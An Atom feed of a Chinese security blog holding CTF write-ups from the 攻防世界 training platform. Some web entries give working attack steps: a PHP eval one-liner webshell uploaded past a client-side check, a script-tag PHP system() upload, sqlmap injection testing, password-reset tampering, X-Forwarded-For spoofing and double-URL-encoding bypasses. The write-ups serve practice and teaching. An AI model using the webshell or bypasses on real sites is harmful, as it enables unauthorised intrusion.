<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BitSec&#39;s Blog</title>
  
  <subtitle>天道酬勤，厚德载物</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-18T12:35:35.484Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BitSec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>giveyouflag</title>
    <link href="http://yoursite.com/2019/11/18/giveyouflag/"/>
    <id>http://yoursite.com/2019/11/18/giveyouflag/</id>
    <published>2019-11-18T12:14:46.000Z</published>
    <updated>2019-11-18T12:35:35.484Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-give-you-flag"><a href="#src-攻防世界-give-you-flag" class="headerlink" title="[src = 攻防世界] give_you_flag"></a>[src = 攻防世界] give_you_flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开图片，发现似乎有个二维码。通过工具（gif分离器）将各帧分离。得到52张图片，其中第49张包含一个二维码，但是缺少了3个定位符。手动添加，扫码即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-give-you-flag&quot;&gt;&lt;a href=&quot;#src-攻防世界-give-you-flag&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] give_you_flag&quot;&gt;&lt;/a&gt;[src = 攻防世界] give_you_flag&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>ext3</title>
    <link href="http://yoursite.com/2019/11/18/ext3/"/>
    <id>http://yoursite.com/2019/11/18/ext3/</id>
    <published>2019-11-18T12:06:28.000Z</published>
    <updated>2019-11-18T12:15:56.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-ext3"><a href="#src-攻防世界-ext3" class="headerlink" title="[src = 攻防世界] ext3"></a>[src = 攻防世界] ext3</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>今天是菜狗的生日，他收到了一个linux系统光盘<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>将下载附件放到linux系统查看file格式，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># file 630a886233764ec2a63f305f318c8baa </span></span><br><span class="line">630a886233764ec2a63f305f318c8baa: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa</span><br></pre></td></tr></table></figure><p>再strings查看一下有没有flag这样的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># strings 630a886233764ec2a63f305f318c8baa |grep flag</span></span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br></pre></td></tr></table></figure><p>flag应该在flag.txt中。</p><p>挂载光盘：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># mount 630a886233764ec2a63f305f318c8baa /mnt</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd /mnt</span></span><br><span class="line">root@kali:/mnt<span class="comment"># ls</span></span><br><span class="line">02CdWGSxGPX.bin  0Xs    4A           8HhWfV9nK1  gtj        i             KxEQM           LvuGM       n              OOoOs      Q          rhZE1LZ6g   SPaK8l2sYN</span><br><span class="line">0GY1l            1      6JR3         8nwg        h          imgLDPt4BY    LG6F            lWIRfzP     NgzQPW         orcA       qkCN8      Ruc9        SrZznhSAj</span><br><span class="line">0h3a5            2X     6wUaZE1vbsW  8RxQG4bvd   H          ix1EMRHRpIc2  Lh              m           Nv             oSx2p      QmUY1d     RZTOGd      t</span><br><span class="line">0l               3      7H7geLlS5    FinD        H2Zj8FNbu  j6uLMX        LlC6Z0zrgy.bin  m9V0lIaElz  o              OT         QQY3sF63w  scripts     T</span><br><span class="line">0qsd             3J     8A2MFawD4    fm          hdi7       jE            LO0J8           MiU         O7avZhikgKgbF  poiuy7Xdb  r          sdb.cramfs  TFGVOSwYd.txt</span><br><span class="line">0wDq5            44aAm  8DQFirm0D    g           hYuPvID    jj            lost+found      Mnuc        o8             px6u       Raf3SYj    sn</span><br><span class="line">root@kali:/mnt<span class="comment"># cd O7avZhikgKgbF/</span></span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># cat flag.txt</span></span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure><p>一串base64，解码即可得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-ext3&quot;&gt;&lt;a href=&quot;#src-攻防世界-ext3&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ext3&quot;&gt;&lt;/a&gt;[src = 攻防世界] ext3&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;今天是菜狗的生日，他收到了一个linux系统光盘&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="ext3" scheme="http://yoursite.com/tags/ext3/"/>
    
  </entry>
  
  <entry>
    <title>ics04</title>
    <link href="http://yoursite.com/2019/11/18/ics04/"/>
    <id>http://yoursite.com/2019/11/18/ics04/</id>
    <published>2019-11-18T11:21:08.000Z</published>
    <updated>2019-11-18T12:06:11.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-ics-04"><a href="#src-攻防世界-ics-04" class="headerlink" title="[src = 攻防世界] ics-04"></a>[src = 攻防世界] ics-04</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目提示登录和注册页面存在漏洞，随便注册一个账号登录，提示“普通用户登录成功,没什么用”。那就看看存不存在SQL注入吧。</p><p>对注册页面和登录页面使用sqlmap进行测试，对于POST方法对测试可以按照如下方法进行，首先使用burp抓包，然后使用“copy to file”功能将请求保存，然后sqlmap -r 文件名即可。比如保存对文件为sq.txt，则使用的sqlmap命令为sqlmap -r sq.txt.</p><p>或者对于POST数据使用–data参数，比如POST数据为username=bitsec，则可以使用如下sqlmap命令：<br>sqlmap -u “***” –data=”username=bitsec”.</p><p>测试所有页面，发现找回密码处有注入,并得到user表里面对数据为：</p><p><img src="./ics041.PNG" alt="isc04"><br>但是无法爆破出来密码。</p><p>但是我们发现注册页面可以重新注册用户，且没有任何验证。所以我们重新注册该用户c3tlwDmIn23，并登录得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-ics-04&quot;&gt;&lt;a href=&quot;#src-攻防世界-ics-04&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ics-04&quot;&gt;&lt;/a&gt;[src = 攻防世界] ics-04&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQL注入，逻辑错误" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5%EF%BC%8C%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>http-header</title>
    <link href="http://yoursite.com/2019/11/18/http-header/"/>
    <id>http://yoursite.com/2019/11/18/http-header/</id>
    <published>2019-11-18T10:17:17.000Z</published>
    <updated>2019-11-18T10:45:31.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改HTTP头的方法"><a href="#修改HTTP头的方法" class="headerlink" title="修改HTTP头的方法"></a>修改HTTP头的方法</h2><ol><li>使用浏览器插件，比如Firefox的Tamper Data。如图：</li></ol><p><img src="./httpheader1.PNG" alt="http-head"></p><ol start="2"><li>CURL（KALI内置）添加修改头部信息，比如添加文件头：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -H 'referer: https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>添加Referrer头可以直接使用-e参数，所以上面的命令可以等同于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -e 'https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>关于CURL使用参考：<a href="https://catonmat.net/cookbooks/curl" target="_blank" rel="noopener">https://catonmat.net/cookbooks/curl</a></p><ol start="3"><li>基于Burp抓包修改：</li></ol><p><img src="./httpheader2.PNG" alt="http-head"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;修改HTTP头的方法&quot;&gt;&lt;a href=&quot;#修改HTTP头的方法&quot; class=&quot;headerlink&quot; title=&quot;修改HTTP头的方法&quot;&gt;&lt;/a&gt;修改HTTP头的方法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用浏览器插件，比如Firefox的Tamper Data。如图
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
      <category term="HEADER" scheme="http://yoursite.com/tags/HEADER/"/>
    
  </entry>
  
  <entry>
    <title>bug</title>
    <link href="http://yoursite.com/2019/11/18/bug/"/>
    <id>http://yoursite.com/2019/11/18/bug/</id>
    <published>2019-11-18T01:23:02.000Z</published>
    <updated>2019-11-18T02:43:31.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-bug"><a href="#src-攻防世界-bug" class="headerlink" title="[src = 攻防世界] bug"></a>[src = 攻防世界] bug</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入弹窗提示“Please Login！”，然后显示登陆框。随便注册一个账号。如图：</p><p><img src="./bug1.PNG" alt="bug"></p><p>然后登录成功。但没有发现大的问题。重点关注首页对Findpwd功能，因为密码修改对逻辑错误经常导致安全问题，因此对修改密码过程进行抓包，如下图：</p><p><img src="./bug2.PNG" alt="bug"></p><p>点击reset后，进入burp抓包界面，如下图：</p><p><img src="./bug3.PNG" alt="bug"></p><p>将其中的username修改为admin，然后forward。发现密码修改成功。如图，基于admin账号登录成功。</p><p><img src="./bug4.PNG" alt="bug"></p><p>点击manage页面，但是页面显示“IP Not allowed！”。这应该是只允许在内网才能访问管理页面，现在是外网，该功能不能使用，因此通过修改X-Forwarded-For头为127.0.0.1，来欺骗系统，进入管理页面。显示</p><p><img src="./bug5.PNG" alt="bug"></p><p>查看源文件，发现页面对注释中包含：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></span><br></pre></td></tr></table></figure><p>访问该网页：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:55218/index.php?module=filemanage&amp;do=upload</span><br></pre></td></tr></table></figure><p>发现文件上传页面，如图：</p><p><img src="./bug6.PNG" alt="bug"></p><p>提示只能上次image，上传下面的php代码（这是文件内容绕过，所以不能使用”&lt;?php ?&gt;”）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>system('ls');<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包后修改后缀为php5（php4也可以，但是直接修改为php不允许）。</p><p><img src="./bug7.PNG" alt="bug"></p><p>弹窗得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-bug&quot;&gt;&lt;a href=&quot;#src-攻防世界-bug&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] bug&quot;&gt;&lt;/a&gt;[src = 攻防世界] bug&lt;/h2&gt;&lt;h3 id=&quot;WP&quot;&gt;&lt;a href=&quot;#WP&quot;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="逻辑错误" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>upload1</title>
    <link href="http://yoursite.com/2019/11/17/upload1/"/>
    <id>http://yoursite.com/2019/11/17/upload1/</id>
    <published>2019-11-17T03:21:43.000Z</published>
    <updated>2019-11-17T04:11:50.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-upload1"><a href="#src-攻防世界-upload1" class="headerlink" title="[src = 攻防世界] upload1"></a>[src = 攻防世界] upload1</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>明显的文件上传漏洞。本题是基于js的前段校验。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">upfile = <span class="built_in">document</span>.getElementById(<span class="string">"upfile"</span>);</span><br><span class="line">submit = <span class="built_in">document</span>.getElementById(<span class="string">"submit"</span>);</span><br><span class="line">name = upfile.value;</span><br><span class="line">ext = name.replace(<span class="regexp">/^.+\./</span>,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'jpg'</span>,<span class="string">'png'</span>].contains(ext))&#123;</span><br><span class="line">    submit.disabled = <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    submit.disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    alert(<span class="string">'请选择一张图片文件上传!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许jpg和png格式，但是我们知道前段校验可以非常容易对绕过。我们首先写一个一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'bitsec'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将文件后缀改为jpg，然后设置代理，通过burp进行抓包，如图</p><p><img src="./upload11.PNG" alt="upload1"></p><p>将其中的后缀改为php，然后forward即可上传成功，如图。</p><p><img src="./upload12.PNG" alt="upload1"></p><p>页面回显：upload success : upload/1573961293.123.php </p><p>通过中国菜刀等webshell工具连接成功，如图：</p><p><img src="./upload13.PNG" alt="upload1"></p><p>访问目录，发现flag.php文件，打开就得到flag：</p><p><img src="./upload14.PNG" alt="upload1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-upload1&quot;&gt;&lt;a href=&quot;#src-攻防世界-upload1&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] upload1&quot;&gt;&lt;/a&gt;[src = 攻防世界] upload1&lt;/h2&gt;&lt;h3 id=&quot;W
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="文件上传，一句话木马，webshell" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8Cwebshell/"/>
    
  </entry>
  
  <entry>
    <title>PHP2</title>
    <link href="http://yoursite.com/2019/11/17/PHP2/"/>
    <id>http://yoursite.com/2019/11/17/PHP2/</id>
    <published>2019-11-17T02:55:46.000Z</published>
    <updated>2019-11-17T03:22:20.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-PHP2"><a href="#src-攻防世界-PHP2" class="headerlink" title="[src = 攻防世界] PHP2"></a>[src = 攻防世界] PHP2</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>熟悉php的应该知道phps文件可以用来读取php代码，这里就是可以看到此问题导致对源码泄露，直接访问index.phps，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>需要满足两个条件：<br>第一步，要使得”admin”===$_GET[id]不成立</p><p>第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。</p><p>看似矛盾，关键在理解urldecode函数的行为，其解释为解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符。</p><p>因为当将URL传递给$_GET[id]时，会进行第一次url解码，这时要求不能解码得到admin，然后再次交给urldecode进行url解码，这次要得到admin。<br>所以构造下面对payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2561</span>dmin</span><br></pre></td></tr></table></figure><p>第一次url解码得到（将%25解码成%）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">61</span>dmin</span><br></pre></td></tr></table></figure><p>此时满足了第一步的条件。然后第二次交给urldecode函数，这次将%61解码成字符a，变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=admin</span><br></pre></td></tr></table></figure><p>满足第二步条件，得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-PHP2&quot;&gt;&lt;a href=&quot;#src-攻防世界-PHP2&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] PHP2&quot;&gt;&lt;/a&gt;[src = 攻防世界] PHP2&lt;/h2&gt;&lt;h3 id=&quot;WP&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="信息泄露，URL编码与解码" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8CURL%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Training-WWW-Robots</title>
    <link href="http://yoursite.com/2019/11/17/Training-WWW-Robots/"/>
    <id>http://yoursite.com/2019/11/17/Training-WWW-Robots/</id>
    <published>2019-11-17T02:41:23.000Z</published>
    <updated>2019-11-17T02:44:09.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-Training-WWW-Robots"><a href="#src-攻防世界-Training-WWW-Robots" class="headerlink" title="[src = 攻防世界] Training-WWW-Robots"></a>[src = 攻防世界] Training-WWW-Robots</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>都提示Robots了，直接访问：<br>&lt;网址&gt;/robots.txt<br>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure><p>然后访问/fl0g.php得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-Training-WWW-Robots&quot;&gt;&lt;a href=&quot;#src-攻防世界-Training-WWW-Robots&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] Training-WWW-Robots&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="robots" scheme="http://yoursite.com/tags/robots/"/>
    
  </entry>
  
  <entry>
    <title>lottery</title>
    <link href="http://yoursite.com/2019/11/16/lottery/"/>
    <id>http://yoursite.com/2019/11/16/lottery/</id>
    <published>2019-11-16T04:48:50.000Z</published>
    <updated>2019-11-16T05:11:20.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-lottery"><a href="#src-攻防世界-lottery" class="headerlink" title="[src = 攻防世界] lottery"></a>[src = 攻防世界] lottery</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3> <a id="more"></a><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开界面我们知道，要拿到flag，就要赢到足够的钱，其实一开始我以为可以找到一个地方直接修改余额什么的，把网页源代码中的文件看了几个都没发现突破口……</p><p>尝试了一下robots.txt，想看看有没有什么文件，然后发现了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure><p>应该是git源码泄露，下载GitHack（<a href="https://github.com/lijiejie/GitHack）" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack）</a>，并进行源码下载。（其实本题还提供了源码附件，直接下载就可以了）</p><p>发现在源码api.php中买彩票对关键代码：</p><p><img src="./lottery2.PNG" alt="lottery"></p><p>可以看到$numbers 来自用户json输入 {“action”:”buy”,”numbers”:”1122334”}，没有检查数据类型。 $win_numbers 是随机生成的数字字符串。</p><p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等。 由于 json 支持布尔型数据，因此可以抓包改包，构造数据：</p><p>原来数据包为：</p><p><img src="./lottery3.PNG" alt="lottery"></p><p>修改后为：</p><p><img src="./lottery4.PNG" alt="lottery"></p><p>经过2-3次对购买彩票，就可以达到购买flag的余额。直接购买就得到flag：</p><p><img src="./lottery5.PNG" alt="lottery"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-lottery&quot;&gt;&lt;a href=&quot;#src-攻防世界-lottery&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] lottery&quot;&gt;&lt;/a&gt;[src = 攻防世界] lottery&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="代码审计，源码泄露" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8C%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>isc-06</title>
    <link href="http://yoursite.com/2019/11/16/isc-06/"/>
    <id>http://yoursite.com/2019/11/16/isc-06/</id>
    <published>2019-11-16T04:28:25.000Z</published>
    <updated>2019-11-16T05:09:01.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-isc-06"><a href="#src-攻防世界-isc-06" class="headerlink" title="[src = 攻防世界] isc-06"></a>[src = 攻防世界] isc-06</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入题目，发现只有报表中心可以打开，发现一个列表页面。URL中有?id=1。可能是SQL注入。但测试发现不是。题目提示数据被删除，但留下了一点痕迹。所以考虑id为某个值对数据被保留，其他被删除了。所以考虑爆破id字段。</p><p>用Burp抓包，并对id字段进行爆破，讲payload type设置为Numbers，如图：</p><p><img src="./isc1.PNG" alt="isc"></p><p>爆破到id=2333时得到flag。</p><p><img src="./isc2.PNG" alt="isc"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-isc-06&quot;&gt;&lt;a href=&quot;#src-攻防世界-isc-06&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] isc-06&quot;&gt;&lt;/a&gt;[src = 攻防世界] isc-06&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="爆破" scheme="http://yoursite.com/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>cat</title>
    <link href="http://yoursite.com/2019/11/16/cat/"/>
    <id>http://yoursite.com/2019/11/16/cat/</id>
    <published>2019-11-16T03:43:40.000Z</published>
    <updated>2019-11-16T05:12:04.380Z</updated>
    
